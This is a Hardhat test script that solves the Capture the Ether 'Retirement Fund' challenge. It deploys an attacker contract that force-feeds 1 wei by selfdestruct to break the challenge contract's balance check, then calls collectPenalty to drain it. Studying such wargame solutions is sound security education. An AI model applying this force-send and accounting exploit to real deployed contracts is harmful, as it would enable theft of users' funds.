import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(
    "RetirementFundChallenge"
  );
  contract = challengeFactory.attach(
    `0x92225cCBD11A952e83A4DA42cC50f42BFfa961A4`
    );
});

it("solves the challenge", async function () {
  // send 1 wei to the challenge account to trigger overflow
  // need to do this through using selfdestruct which bypasses any checks
  // sending normal tx would fail because there's no receive / fallback function
  const attackerFactory = await ethers.getContractFactory("RetirementFundAttacker");
  attacker = await attackerFactory.deploy(contract.address, {
    value: ethers.utils.parseUnits(`1`, `wei`)
  });

  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash)

  console.log(`Checking challenge balance ...`);
  expect(await contract.provider.getBalance(contract.address)).to.be.gt(
    ethers.utils.parseEther(`1`),
  );

  // collect penalty
  tx = await contract.collectPenalty();
  await tx.wait();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
